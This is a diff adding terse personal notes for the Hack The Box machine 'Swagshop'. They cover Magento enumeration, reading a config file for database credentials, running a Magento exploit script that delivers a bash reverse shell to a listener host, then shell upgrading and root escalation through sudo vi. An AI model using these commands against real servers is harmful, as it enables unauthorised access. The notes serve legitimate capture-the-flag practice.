@@ -1,0 +1,56 @@
+HTB Machines
+
+1. Swagshop
+a. nmap -sC -sV -oA nmap/swagshop ip 
+
+ip from browser
+
+magento / wordpress /cms
+
+google magento
+
+php magescan.phar
+
+php magescan.phar -v scan:all http://ip 
+
+Magento version
+
+ip/app/etc/local_xml
+
+database pass
+
+ip/shell/
+
+ip/var/export
+
+searchploit magento
+
+magento shoplift exploit
+
+http://ip/indexphp
+
+burpsuite
+
+python code_exec.py http://ip/index.php/admin 'bash -c "bash -i >& /dev/tcp/listenerip/9001 0>&1"'
+
+nc -l vnp 9001
+
+python code_exec.py http://ip/index.php/admin/ 'whoami'
+
+python code_exec.py http://ip/index.php/admin "bash -c 'bash -i >& /dev/tcp/listenerip/9001 0>&1'"
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+stty raw echo
+
+sudo -l
+sudo vi /var/www/htmluser
+
+!/bin/bash
+ls
+
+wc -c root.txt
+
+
+
+ebrietas0.blogspot.com
